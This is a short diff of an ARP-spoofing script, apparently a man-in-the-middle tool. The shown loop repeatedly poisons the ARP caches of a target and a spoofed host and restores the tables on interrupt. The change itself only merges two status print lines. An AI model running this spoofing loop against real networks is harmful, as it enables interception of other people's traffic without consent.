@@ -24,9 +24,8 @@ def spoof(target_ip, spoof_ip):
     try:
         while True:
             arp_spoof(target_ip, spoof_ip)
-            print(f"\r[+] Sent spoof packets to {target_ip} and {spoof_ip}")
             arp_spoof(spoof_ip, target_ip)
-            print(f"\r[+] Sent spoof packets to {target_ip} and {spoof_ip}")
+            print(f"[+] Sent spoof packets to {target_ip} and {spoof_ip}")
             
     except KeyboardInterrupt:
         print("Restoring ARP tables...")
